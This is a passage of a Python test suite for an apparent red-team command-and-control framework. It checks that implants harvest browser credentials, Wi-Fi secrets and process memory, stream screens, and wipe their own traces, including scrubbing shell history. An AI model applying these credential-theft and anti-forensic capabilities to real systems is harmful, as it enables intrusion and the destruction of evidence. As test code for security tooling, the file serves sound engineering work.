    for tool in ("netsh wlan show profiles", "networksetup",
                 "nmcli --show-secrets", "wmctrl", "xdotool", "import",
                 "scrot", "maim", "xclip", "ioreg", "lsusb", "aa-status",
                 "MiniDumpWriteDump", "EnumWindows", "/proc/"):
        assert tool in senses or tool in go_senses, tool

    # The Go implant runs them too: the fourth implementation is not a
    # toy either.
    for kind in kinds:
        assert f'"{kind}"' in go_senses or f'"{kind}"' in read_text(
            "implant/go/internal/beacon/tasks.go"), kind

    # The phone answers the same names with the truth of the phone.
    for marker in ("fun windows(", "fun avSurvey(", "fun usb(",
                   "fun memory(", "fun wifiProfiles(", "fun browserCreds("):
        assert marker in phone, marker

    # And the reference server answers them all.
    token = b"desktop-token-0123456789abcd"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-desktop", interval=0.2)
    agent.start()
    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        assert wait_until(lambda: bool(client.agents()), timeout=10), (
            "the agent never showed up")
        for kind, args in (
            ("window.list", {}),
            ("clipboard.watch", {"action": "status"}),
            ("screen.stream", {"frames": 2}),
            ("wifi.profiles", {}),
            ("browser.creds", {}),
            ("av.survey", {}),
            ("usb.history", {}),
            ("proc.memory", {"pid": "4242"}),
        ):
            task_id = client.submit("agent-desktop", kind, args)
            assert wait_until(
                lambda: client.task(task_id).get("state") in ("done", "failed"),
                timeout=15), f"{kind} never came back"
            record = client.task(task_id)
            assert record.get("state") == "done", record
            output = record.get("output") or record.get("out") or ""
            if isinstance(output, bytes):
                output = output.decode("utf-8", "replace")
            assert output, f"{kind} answered nothing"
            assert kind.split(".")[0] in output, (kind, output)
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_desktop_senses_say_what_they_could_not_read():
    """A family that cannot read everything has to say so.

    The wireless key of another user, a locked browser and the memory of
    a process of another user are not readable; the report says that
    instead of pretending that the machine has nothing to give, and the
    secrets of the browsers stay off the wire unless the operator asks
    for them.
    """
    senses = read_text("implant/rust/src/senses.rs")
    go_senses = read_text("implant/go/internal/beacon/senses.go")
    phone = read_text("implant/android/app/src/main/java/io/umbra/beacon/"
                      "Desktop.kt")
    task = read_text("implant/rust/src/task.rs")

    # The refusals of the desktop.
    assert "is not readable" in senses, "the desktop pretends to see everything"
    assert "not readable without the entitlement" in senses, (
        "the memory of a mac would pretend that it is readable")
    assert "could not be read" in senses, (
        "the database of a browser would pretend that it is readable")
    assert "is not readable" in go_senses, "the go implant pretends too"

    # The secrets of the browsers are only on the wire when the operator
    # asks for them.
    assert "to_value(raw)" in task, "the secret of a browser is always sent"
    assert "redacted" in read_text("implant/rust/src/creds.rs"), (
        "the record does not say that it was redacted")

    # The phone refuses the two families the platform keeps to itself,
    # and it names the reason.
    assert "since the tenth version" in phone, (
        "the phone would pretend that it reads the saved networks")
    assert "storage of another application is not readable" in phone, (
        "the phone would pretend that it reads the databases of the browsers")

    # The desktop refuses the families of the phone.
    assert "the senses of the phone need the phone implant" in task, (
        "the desktop answers the families of the phone")
    assert "the window of the phone needs the phone implant" in task, (
        "the desktop answers the window of the phone")


def test_the_stream_of_the_screen_travels_in_pieces():
    """A picture is bigger than a frame, so the stream is cut into pieces.

    Every implementation sends the chunks of a streamed answer as partial
    results: the task stays open while the pieces travel, and the final
    result closes it.
    """
    rust_outcome = read_text("implant/rust/src/task.rs")
    rust_beacon = read_text("implant/rust/src/beacon.rs")
    go_outcome = read_text("implant/go/internal/beacon/tasks.go")
    go_beacon = read_text("implant/go/internal/beacon/beacon.go")
    phone = read_text("implant/android/app/src/main/java/io/umbra/beacon/"
                      "Beacon.kt")

    # The outcome of a task carries the chunks.
    assert "pub chunks: Vec<Vec<u8>>" in rust_outcome, (
        "the rust implant has no place for the chunks of a stream")
    assert "Chunks [][]byte" in go_outcome, (
        "the go implant has no place for the chunks of a stream")

    # The beacon sends them as partial results.
    assert '"partial"' in rust_beacon, "the rust beacon sends no partial result"
    assert "std::mem::take(&mut outcome.chunks)" in rust_beacon, (
        "the rust beacon does not empty the chunks of the outcome")
    assert '"partial"' in go_beacon, "the go beacon sends no partial result"
    assert '"partial": true' in go_beacon, (
        "the go beacon does not mark the partial results")
    assert "partialValue" in phone, "the phone sends no partial result"

    # The screen of the desktop is the family that uses them.
    assert "outcome.chunks = frames" in rust_outcome, (
        "the stream of the screen is not cut into pieces")


def test_the_wipe_of_the_host_is_implemented_everywhere():
    """The seven tasks of the zero-footprint wipe.

    Every kind has to be implemented on the desktop, on the phone and on
    the Go implant, advertised by the reference server and documented --
    and every one of them has to answer, because a task nobody answers
    is a task the operator waits for forever.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    rust = read_text("implant/rust/src/forensics.rs")
    rust_task = read_text("implant/rust/src/task.rs")
    go = read_text("implant/go/internal/beacon/forensics.go")
    go_task = read_text("implant/go/internal/beacon/tasks.go")
    phone = read_text("implant/android/app/src/main/java/io/umbra/beacon/Wipe.kt")
    phone_task = read_text("implant/android/app/src/main/java/io/umbra/beacon/"
                            "TaskRunner.kt")
    protocol = read_text("docs/PROTOCOL.md")

    kinds = ("wipe.survey", "wipe.run", "wipe.verify", "wipe.self",
             "forensics.report", "forensics.timeline", "decommission")

    # The desktop implant runs them.
    for kind in kinds:
        assert f'"{kind}"' in rust_task, kind
        assert f"| `{kind}` |" in protocol, kind

    # The Go implant runs them too: the fourth implementation is not a
    # toy either.
    for kind in kinds:
        assert f'"{kind}"' in go_task, kind

    # The phone answers the same names.
    for kind in kinds:
        assert f'"{kind}"' in phone_task, kind

    # The three implementations share the same four answers.
    for module in (rust, go, phone):
        for marker in ("wipe.survey", "wipe.run", "wipe.verify",
                       "wipe.self", "forensics.report", "forensics.timeline"):
            assert marker in module, marker

    # And the reference server answers them all.
    token = b"wipe-token-0123456789abcdef"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-wipe", interval=0.2)
    agent.start()
    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        assert wait_until(lambda: bool(client.agents()), timeout=10), (
            "the agent never showed up")
        for kind, args in (
            ("wipe.survey", {}),
            ("wipe.run", {"what": ["state", "history"]}),
            ("wipe.verify", {}),
            ("forensics.report", {}),
            ("forensics.timeline", {}),
        ):
            task_id = client.submit("agent-wipe", kind, args)
            assert wait_until(
                lambda: client.task(task_id).get("state") in ("done", "failed"),
                timeout=15), f"{kind} never came back"
            record = client.task(task_id)
            assert record.get("state") == "done", record
            output = record.get("output") or record.get("out") or ""
            if isinstance(output, bytes):
                output = output.decode("utf-8", "replace")
            assert output, f"{kind} answered nothing"
            assert kind.split(".")[0] in output, (kind, output)
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_wipe_says_what_it_could_not_remove():
    """A wipe that claims a clean machine it did not clean is a lie.

    The limits of the platform are named and explained, and the history
    of the user is scrubbed and never deleted: the lines that mention
    the implant go, the rest of the file stays.
    """
    rust = read_text("implant/rust/src/forensics.rs")
    go = read_text("implant/go/internal/beacon/forensics.go")
    phone = read_text("implant/android/app/src/main/java/io/umbra/beacon/Wipe.kt")

    # The limits are reported, not pretended away.
    for module in (rust, go, phone):
        assert "limit" in module, "the wipe has no limits"
        assert "out of reach" in module or "out of the reach" in module, (
            "the wipe does not say what it cannot reach")
    assert "limit.mft" in rust, "the windows limits are not named"
    assert "limit.utmp" in go, "the posix limits are not named"
    assert "limit.logcat" in phone, "the limits of the phone are not named"

    # The history of the user is scrubbed, not deleted.
    assert '"scrub"' in rust, "the history is not scrubbed"
    assert "filter(|line| !mentions(line, &markers))" in rust, (
        "the scrub of the history would delete the lines of the user")
    assert "forensicMentions(line, markers)" in go, (
        "the scrub of the history would delete the lines of the user")
    assert "filter { line ->" in phone or "filter" in phone, (
        "the phone does not scrub the history")

    # The wipe says which family it touched, and what is left.
    for module in (rust, go, phone):
        assert "are still on this host" in module or "still on this phone" in module, (
            "the wipe does not say what is left")


def test_the_end_of_the_engagement_is_the_work_of_an_admin():
    """The two kinds that burn a host are one door, not five.

    They are refused to everybody but an admin whichever path they
    travel, and the console asks before it destroys anything.
    """
    rbac = read_text("server/internal/rbac/rbac.go")
    operator = read_text("server/internal/link/operator.go")
    console = read_text("operator/umbra_cli/cli.py")

    # The roles of the seven commands.
    for command, role in (
        ("forensics.survey", "Viewer"),
        ("forensics.report", "Viewer"),
        ("forensics.verify", "Viewer"),
        ("forensics.timeline", "Viewer"),
        ("forensics.wipe", "Operator"),
        ("forensics.self", "Admin"),
        ("forensics.decommission", "Admin"),
    ):
        assert re.search(rf'"{command}":\s+{role},', rbac), command

    # The guard sits in every path that queues a kind.
    for path in ("task.submit", "task.bulk", "task.chain", "schedule.add",
                 "alias.run"):
        section = operator.split(f'case "{path}"', 1)[1].split("case ", 1)[0]
        assert "forensicGuard(" in section, path
    assert "forensicGuardedKinds" in operator, "the guarded kinds are not named"
    assert '"wipe.self":    true,' in operator, "wipe.self is not guarded"
    assert '"decommission": true,' in operator, "decommission is not guarded"

    # The console asks before it ends an engagement.
    assert "type 'vanish' to continue" in console, (
        "the console destroys the implant without asking")
    assert "type 'decommission' to continue" in console, (
        "the console ends the engagement without asking")

    # And the console knows the seven shortcuts.
    for command in ("survey", "forensics", "scrub", "verify", "journal",
                    "vanish", "decommission"):
        assert f'add_parser("{command}"' in console, command


def test_the_journal_of_the_engagement_is_off_until_the_operator_asks():
    """An implant that writes a record of its own actions carries evidence.

    The journal of the engagement is a trace like any other, so it is
    written only while the operator asks for it -- and the wipe removes
    it like any other artefact.
    """
    rust = read_text("implant/rust/src/forensics.rs")
    rust_beacon = read_text("implant/rust/src/beacon.rs")
    go = read_text("implant/go/internal/beacon/forensics.go")
    go_beacon = read_text("implant/go/internal/beacon/beacon.go")
    phone = read_text("implant/android/app/src/main/java/io/umbra/beacon/Wipe.kt")
    phone_beacon = read_text("implant/android/app/src/main/java/io/umbra/beacon/"
                             "Beacon.kt")

    # The flag of the journal.
    assert "journal.on" in rust, "the journal of the desktop has no flag"
    assert "journal.on" in go, "the journal of the go implant has no flag"
    assert "JOURNAL_FLAG" in phone, "the journal of the phone has no flag"

    # The beacon writes only while it is on.
    assert "if crate::forensics::journal_enabled()" in rust_beacon, (
        "the rust beacon writes the journal whatever the operator says")
    assert "if forensicJournalEnabled()" in go_beacon, (
        "the go beacon writes the journal whatever the operator says")
    assert "Wipe.journalEnabled(stateDir)" in phone_beacon, (
        "the phone writes the journal whatever the operator says")

    # The journal lives in the state of the implant, so the wipe of the
    # state takes it with it.
    assert 'join(".umbra").join("journal.state")' in rust, (
        "the journal of the desktop does not live in the state")
    assert "journal.state" in go, "the journal of the go implant is elsewhere"


def test_the_dead_man_switch_ends_an_implant_nobody_watches():
    """An implant that outlives its engagement is an implant nobody owns.

    The switch is armed by the operator, every check-in renews the
    window and the silence of the team ends the implant by itself.  It
    lives in the state directory of the implant, so a reboot does not
    disarm it, and arming it is the work of an admin: it is the end of
    an engagement waiting to happen.
    """
    rust = read_text("implant/rust/src/forensics.rs")
    rust_task = read_text("implant/rust/src/task.rs")
    rust_beacon = read_text("implant/rust/src/beacon.rs")
    go = read_text("implant/go/internal/beacon/forensics.go")
    go_task = read_text("implant/go/internal/beacon/tasks.go")
    go_beacon = read_text("implant/go/internal/beacon/beacon.go")
    phone = read_text("implant/android/app/src/main/java/io/umbra/beacon/Wipe.kt")
    phone_task = read_text("implant/android/app/src/main/java/io/umbra/beacon/"
                           "TaskRunner.kt")
    phone_beacon = read_text("implant/android/app/src/main/java/io/umbra/beacon/"
                             "Beacon.kt")
    protocol = read_text("docs/PROTOCOL.md")
    rbac = read_text("server/internal/rbac/rbac.go")

    # The kind exists in the three implants and in the documentation.
    assert '"wipe.deadman"' in rust_task
    assert '"wipe.deadman"' in go_task
    assert '"wipe.deadman"' in phone_task
    assert "| `wipe.deadman` |" in protocol

    # The switch has a file of its own in the state directory.
    for module, marker in ((rust, "deadman.state"), (go, "deadman.state"),
                           (phone, "deadman.state")):
        assert marker in module, module[:40]

    # The window is armed, renewed and read.
    assert "deadman_arm" in rust
    assert "deadman_renew" in rust
    assert "deadman_fired" in rust
    assert "forensicDeadmanArm" in go
    assert "forensicDeadmanRenew" in go
    assert "forensicDeadmanFired" in go
    assert "deadmanArm" in phone
    assert "deadmanRenew" in phone
    assert "deadmanFired" in phone

    # The beacon fires the switch and renews it on every check-in: the
    # switch is only quiet when the team is.
    assert "deadman" in rust_beacon.lower()
    assert "deadman" in go_beacon.lower()
    assert "deadman" in phone_beacon.lower()

    # The command is the work of an admin.
    assert re.search(r'"forensics.deadman":\s+Admin,', rbac), (
        "the dead man's switch is not an admin command")


def test_the_report_of_the_wipe_is_signed():
    """The proof of what was removed outlives the host.

    The implant signs the report with the key of the agent and a label
    that keeps a signature over a report from being a signature over a
    frame; the server checks it in constant time and records the
    answer in the metadata of the task.
    """
    rust_task = read_text("implant/rust/src/task.rs")
    go = read_text("implant/go/internal/beacon/forensics.go")
    phone_task = read_text("implant/android/app/src/main/java/io/umbra/beacon/"
                           "TaskRunner.kt")
    agent = read_text("server/internal/link/agent.go")
    mock = read_text("tools/mock_server.py")
    # The label is a constant of every implementation, not a literal that
    # is written again in every file.
    rust_crypto = read_text("implant/rust/src/crypto.rs")
    go_crypto = read_text("implant/go/internal/crypt/crypt.go")
    phone_crypto = read_text("implant/android/app/src/main/java/io/umbra/beacon/"
                             "Crypto.kt")
    server_crypto = read_text("server/internal/crypt/crypt.go")
    python_crypto = read_text("operator/umbra_cli/crypto.py")

    # The label is the same everywhere.
    for module in (rust_crypto, go_crypto, phone_crypto, server_crypto,
                   python_crypto):
        assert "umbra/w1/attest" in module, module[:40]

    # And the code that signs uses the constant.
    for module in (rust_task, go, phone_task, agent):
        assert "LABEL_ATTEST" in module or "LabelAttest" in module, module[:40]
    assert "crypto.attest" in mock, "the mock does not sign with the helper"

    # The signature is an HMAC-SHA256 and the comparison is constant
    # time: the signature is public, but the habit is worth keeping.
    assert "hmac" in agent.lower()
    assert "hmac.Equal" in agent, "the comparison of the signature is not constant time"
    assert "hmac.Equal" in mock or "compare_digest" in mock, (
        "the comparison of the signature is not constant time")

    # The server records the answer of the check.
    assert '"attested"' in agent, "the server does not record the attestation"
    assert "verifyAttestation" in agent

    # And the reference server signs its reports the way the implants do.
    assert "_verify_attestation" in mock


def test_the_end_of_an_engagement_reaches_a_group_of_hosts():
    """A wipe of one host is a chore; a wipe of a fleet is an operation.

    The command names one host or a group of them, and the console
    walks the group host by host: the survey, the wipe and the
    verification, so the operator sees the host that did not answer.
    """
    operator = read_text("server/internal/link/operator.go")
    cli = read_text("operator/umbra_cli/cli.py")
    client = read_text("operator/umbra_cli/client.py")
    mock = read_text("tools/mock_server.py")

    # The command takes one host or a group.
    assert "forensicTaskKind" in operator
    assert "selectTargets" in operator, "the command cannot name a group"
    for command in ("forensics.survey", "forensics.wipe", "forensics.verify",
                    "forensics.report", "forensics.timeline", "forensics.self",
                    "forensics.decommission", "forensics.deadman"):
        assert f'case "{command}"' in operator, command

    # The console has a command for the group.
    assert "cleanup" in cli, "the console has no command for a group of hosts"
    assert 'rpc("forensics.deadman"' in client, (
        "the console cannot arm the dead man's switch")
    assert 'rpc("forensics.wipe"' in client, (
        "the console cannot wipe a group of hosts")

    # The reference server answers the group the same way.
    assert "_forensic_task_kind" in mock
    assert "_select_agents" in mock


def test_the_attestation_of_the_reference_server_holds():
    """The proof of the wipe is checked on the way in.

    The reference server verifies the signature of a report the way the
    Go server does and records it in the metadata of the task, so the
    console and the tests see the same answer.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    token = b"attest-token-0123456789abcd"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-attest", interval=0.2)
    agent.start()
    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        assert wait_until(lambda: bool(client.agents()), timeout=10), (
            "the agent never showed up")
        task_id = client.submit("agent-attest", "wipe.survey", {})
        assert wait_until(
            lambda: client.task(task_id).get("state") in ("done", "failed"),
            timeout=15), "the survey never came back"
        record = client.task(task_id)
        assert record.get("state") == "done", record
        meta = record.get("meta") or {}
        assert meta.get("attested") is True, (
            "the server did not verify the attestation of the report")
        assert meta.get("attest"), "the signature did not reach the server"
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_group_wipe_and_the_dead_man_switch_work_end_to_end():
    """The two new commands travel the whole way.

    The wipe of a group reaches every host that matched the filter, and
    the dead man's switch is armed on one host and answered by it.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    token = b"group-token-0123456789abcd"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    one = FakeAgent(server.address, AGENT_PSK, "agent-one", interval=0.2)
    two = FakeAgent(server.address, AGENT_PSK, "agent-two", interval=0.2)
    one.start()
    two.start()
    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        assert wait_until(lambda: len(client.agents()) >= 2, timeout=10), (
            "the agents never showed up")

        # The wipe of a group: every host that matched is queued.
        res = client.rpc("forensics.wipe",
                         {"filter": {"state": "online"}, "what": ["state"]})
        assert res.ok, res.error
        rows = res.data.get("tasks") or []
        assert len(rows) == 2, rows
        assert all(row.get("task_id") for row in rows), rows

        # The dead man's switch: the console arms it on one host.
        res = client.forensics_deadman("agent-one", 60)
        assert res.get("task_id"), res
        task_id = str(res["task_id"])
        assert wait_until(
            lambda: client.task(task_id).get("state") in ("done", "failed"),
            timeout=15), "the switch never came back"
        record = client.task(task_id)
        assert record.get("state") == "done", record
        output = record.get("output") or record.get("out") or ""
        if isinstance(output, bytes):
            output = output.decode("utf-8", "replace")
        # The wording is the one the three implants use.
        assert "ends itself" in output, output
    finally:
        client.close()
        one.stop()
        two.stop()
        server.stop()


def test_the_attestation_of_a_report_is_the_same_everywhere():
    """The label and the bytes of the report are the contract.

    The conformance vectors carry one report, the key that signs it and
    the signature that must come out of it, so every implementation can
    prove it produces the same bytes.
    """
    from umbra_cli import crypto  # noqa: WPS433

    with open(os.path.join(ROOT, "contracts", "vectors.json"), "r",
              encoding="utf-8") as handle:
        vectors = json.load(handle)
    attest = vectors["attest"]
    assert attest["algorithm"] == "hmac-sha256", attest
    assert attest["label"] == crypto.LABEL_ATTEST.decode(), attest
    report = bytes.fromhex(attest["report_hex"])
    assert report.decode() == attest["report_text"], attest
    key = bytes.fromhex(attest["key"])
    assert crypto.attest(key, report).hex() == attest["mac"], (
        "the signature of the report is not the one of the contract")


def test_the_ledger_of_the_operator_is_tamper_evident():
    """The trail of the operator is a chain of hashes.

    The record of what the operator did is evidence too, and evidence
    that can be edited is not evidence.  Every entry carries the hash of
    the entry before it, and the verification walks the chain and names
    the line where it breaks.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    go_audit = read_text("server/internal/audit/audit.go")
    operator = read_text("server/internal/link/operator.go")
    rbac = read_text("server/internal/rbac/rbac.go")
    client_src = read_text("operator/umbra_cli/client.py")

    # The server keeps the chain and knows how to walk it.
    assert "func ChainHash(" in go_audit, "the ledger has no chain"
    assert "func Verify(" in go_audit, "the ledger cannot be verified"
    assert "ChainHash(l.head, e)" in go_audit, "the entries are not linked"
    assert 'case "audit.verify"' in operator, "the server cannot verify"
    assert re.search(r'"audit.verify":\s+Operator,', rbac), (
        "the verification of the ledger is not an operator's work")
    assert 'rpc("audit.verify"' in client_src, (
        "the console cannot verify the ledger")

    # And it works.
    token = b"ledger-token-0123456789ab"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        client.agents()
        res = client.rpc("audit.verify")
        assert res.ok, res.error
        assert res.data.get("ok") is True, res.data
        assert int(res.data.get("entries", 0)) >= 1, res.data
        assert res.data.get("head"), res.data

        # A line that was edited after the fact breaks the chain, and
        # the verification says which line it was.
        with server._lock:
            server.audit_entries[0]["cmd"] = "engagement.wipe"
        res = client.rpc("audit.verify")
        assert res.ok, res.error
        assert res.data.get("ok") is False, res.data
        assert int(res.data.get("broken_at", 0)) == 1, res.data
        assert res.data.get("reason"), res.data
    finally:
        client.close()
        server.stop()


def test_the_machine_of_the_operator_is_a_host_too():
    """The notebook of the console and the typed commands are traces.

    The end of an engagement takes them away: the notebook goes as a
    whole, and the lines of the shell history that name the engagement
    are scrubbed while the rest of the file stays.
    """
    from umbra_cli import hygiene  # noqa: WPS433

    cli = read_text("operator/umbra_cli/cli.py")
    assert "run_clean" in cli, "the console cannot clean its own machine"
    assert "hygiene.scrub_history" in cli
    assert "hygiene.remove_traces" in cli

    # The history is scrubbed, not deleted: the lines of the operator
    # that have nothing to do with the engagement stay.
    with tempfile.TemporaryDirectory() as tmp:
        history = os.path.join(tmp, ".bash_history")
        with open(history, "w", encoding="utf-8") as handle:
            handle.write("ls -la\n")
            handle.write("umbra survey web-01\n")
            handle.write("cat /etc/hosts\n")
        before = open(history, "r", encoding="utf-8").read()
        assert "umbra survey web-01" in before

        original = hygiene.HISTORY_FILES
        try:
            hygiene.HISTORY_FILES = (history,)
            result = hygiene.scrub_history(["umbra "], dry_run=True)
            assert result["removed"] == 1, result
            assert open(history, "r", encoding="utf-8").read() == before, (
                "the dry run touched the history")

            result = hygiene.scrub_history(["umbra "])
            assert result["removed"] == 1, result
            after = open(history, "r", encoding="utf-8").read()
            assert "umbra survey web-01" not in after, after
            assert "ls -la" in after, "the history of the operator was destroyed"
            assert "cat /etc/hosts" in after, "the history of the operator was destroyed"
        finally:
            hygiene.HISTORY_FILES = original

    # The notebook is removed as a whole.
    with tempfile.TemporaryDirectory() as tmp:
        notebook = os.path.join(tmp, "state.db")
        with open(notebook, "w", encoding="utf-8") as handle:
            handle.write("sqlite")
        export = os.path.join(tmp, "export.json")
        with open(export, "w", encoding="utf-8") as handle:
            handle.write("{}")
        found = hygiene.local_traces(notebook)
        assert notebook in found, found
        result = hygiene.remove_traces(found)
        assert not os.path.exists(notebook), "the notebook is still there"
        assert not os.path.exists(export), "the export is still there"
        assert result["removed"], result


def test_the_catalogue_of_the_indicators_is_shared_and_searchable():
    """The hunt: the indicators of the team live in one catalogue.

    An indicator that was found once is worth checking everywhere, so
    the catalogue is shared, it is written to the disk next to the state
    of the server, and it is searched by the words of the team and not
    only by the hash.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    hunt_go = read_text("server/internal/hunt/hunt.go")
    operator = read_text("server/internal/link/operator.go")
    rbac = read_text("server/internal/rbac/rbac.go")
    client_src = read_text("operator/umbra_cli/client.py")
    cli_src = read_text("operator/umbra_cli/cli.py")

    # The catalogue is a package of its own, with a lock and a file.
    assert "package hunt" in hunt_go, "there is no catalogue of the indicators"
    assert "func (c *Catalogue) Add(" in hunt_go
    assert "func (c *Catalogue) Search(" in hunt_go
    assert "func (c *Catalogue) Save(" in hunt_go
    assert "func (c *Catalogue) Load(" in hunt_go
    assert "0o600" in hunt_go, "the catalogue is not written for the owner only"

    # The server answers the four commands of the hunt.
    for command in ("hunt.add", "hunt.list", "hunt.remove", "hunt.sweep"):
        assert f'case "{command}"' in operator, f"the server has no {command}"
        assert f'self.rpc("{command}"' in client_src, (
            f"the console cannot reach {command}")

    # The reader of the catalogue is a viewer; the writer is an operator.
    assert re.search(r'"hunt.list":\s+Viewer,', rbac)
    assert re.search(r'"hunt.add":\s+Operator,', rbac)
    assert re.search(r'"hunt.remove":\s+Operator,', rbac)
    assert re.search(r'"hunt.sweep":\s+Operator,', rbac)

    # And the console has a command for it.
    assert "run_hunt" in cli_src
    assert 'sub.add_parser("hunt"' in cli_src

    token = b"hunt-token-0123456789abcd"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()

        # An indicator goes into the catalogue.
        added = client.hunt_add("hash", "a" * 64, label="the loader of March",
                                source="TICKET-1138")
        assert added.get("id"), added
        assert added.get("kind") == "hash", added
        assert added.get("value") == "a" * 64, added

        # The catalogue is searched by the words of the team.
        listed = client.hunt_list(query="March")
        assert listed["count"] == 1, listed
        assert listed["indicators"][0]["label"] == "the loader of March", listed
        assert listed["indicators"][0]["source"] == "TICKET-1138", listed

        # The same indicator is not added twice.
        with pytest.raises(Exception):
            client.hunt_add("hash", "a" * 64)

        # An indicator without a value is refused.
        with pytest.raises(Exception):
            client.hunt_add("path", "  ")

        # And it leaves the catalogue when the team says so.
        removed = client.hunt_remove(added["id"])
        assert removed.get("removed") is True, removed
        assert client.hunt_list()["count"] == 0
    finally:
        client.close()
        server.stop()


def test_the_hunt_runs_on_every_implementation():
    """The hunt is a task kind: the rust, the kotlin and the go beacon.

    The hunt never changes the host: it reads, it reports, and the
    operator decides what to do with what it found.  Every implant says
    so in the limits of its answer, because a hunt that looked at half of
    the disk and says "not found" is a hunt that lies.
    """
    rust = read_text("implant/rust/src/hunt.rs")
    rust_task = read_text("implant/rust/src/task.rs")
    rust_lib = read_text("implant/rust/src/lib.rs")
    kotlin = read_text("implant/android/app/src/main/java/io/umbra/beacon/Hunt.kt")
    kotlin_task = read_text(
        "implant/android/app/src/main/java/io/umbra/beacon/TaskRunner.kt")
    go_hunt = read_text("implant/go/internal/beacon/hunt.go")
    go_tasks = read_text("implant/go/internal/beacon/tasks.go")
    protocol = read_text("docs/PROTOCOL.md")

    # The task kind is understood by the three implants.
    assert '"hunt.scan" =>' in rust_task, "the rust beacon cannot hunt"
    assert '"hunt.scan" ->' in kotlin_task, "the android beacon cannot hunt"
    assert 'case "hunt.scan":' in go_tasks, "the go beacon cannot hunt"

    # The module of the hunt is a file of its own in every language.
    assert "pub mod hunt;" in rust_lib, "the rust module of the hunt is missing"
    assert "object Hunt" in kotlin, "the kotlin module of the hunt is missing"
    assert "package beacon" in go_hunt, "the go module of the hunt is missing"

    # The hunt never changes the host, and the limits are reported.
    for source, name in ((rust, "rust"), (kotlin, "kotlin"), (go_hunt, "go")):
        assert "never changes" in source, (
            f"the {name} hunt does not say that it only reads")
        assert "limit" in source.lower(), f"the {name} hunt reports no limit"

    # The kinds of the indicator are the same everywhere.
    for kind in ("hash", "path", "process", "service", "mutex", "registry",
                 "certificate"):
        assert kind in rust, f"the rust hunt does not know {kind}"
        assert kind in go_hunt, f"the go hunt does not know {kind}"

    # And the document says what the kind is.
    assert "| `hunt.scan` |" in protocol, "the hunt is not in the protocol"


def test_the_report_of_the_hunt_is_provable():
    """The hunt is signed like every other report of the engagement.

    A hunt that goes into an evidence file has to be provable: the
    report carries the signature of the agent, and the server checks it
    the way it checks the signature of a wipe.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    rust_task = read_text("implant/rust/src/task.rs")
    kotlin_task = read_text(
        "implant/android/app/src/main/java/io/umbra/beacon/TaskRunner.kt")
    go_tasks = read_text("implant/go/internal/beacon/tasks.go")
    mock = read_text("tools/mock_server.py")

    # Every implant signs the report of the hunt.
    assert '"hunt.scan" => attested_answer(ctx, crate::hunt::scan(args))' in (
        rust_task), "the rust beacon does not sign the report of the hunt"
    assert "attested(Hunt.render(report, items))" in kotlin_task, (
        "the android beacon does not sign the report of the hunt")
    assert "b.attested(b.taskHuntScan(args))" in go_tasks, (
        "the go beacon does not sign the report of the hunt")
    assert 'meta["attest"] = crypto.attest(self.psk, report).hex()' in mock, (
        "the reference server does not sign the report of the hunt")

    token = b"hunt-attest-token-01234567"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-hunt", interval=0.2)
    agent.start()
    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        assert wait_until(lambda: bool(client.agents()), timeout=10), (
            "the agent never showed up")
        client.hunt_add("hash", "b" * 64, label="the loader of April")
        swept = client.hunt_sweep(agent_id="agent-hunt")
        task_id = swept["task_id"]
        assert wait_until(
            lambda: client.task(task_id).get("state") in ("done", "failed"),
            timeout=15), "the hunt never came back"
        record = client.task(task_id)
        assert record.get("state") == "done", record
        meta = record.get("meta") or {}
        assert meta.get("attested") is True, (
            "the server did not verify the attestation of the hunt")
        assert meta.get("attest"), "the signature did not reach the server"
        assert "hunt_found" in meta, "the numbers of the hunt are missing"
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_fleet_is_scored_and_explained():
    """The fleet is scored, and the score carries its reasons.

    A score an operator cannot explain is a score nobody acts on, so
    every part of the score says why it is what it is, and the hosts are
    sorted worst first: the operator reads the top of the list.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    health_go = read_text("server/internal/health/health.go")
    operator = read_text("server/internal/link/operator.go")
    rbac = read_text("server/internal/rbac/rbac.go")
    client_src = read_text("operator/umbra_cli/client.py")
    cli_src = read_text("operator/umbra_cli/cli.py")

    # The score is a package of its own, with the five parts of it.
    assert "package health" in health_go, "there is no score of the fleet"
    for part in ("reachability", "cadence", "capacity", "persistence",
                 "posture"):
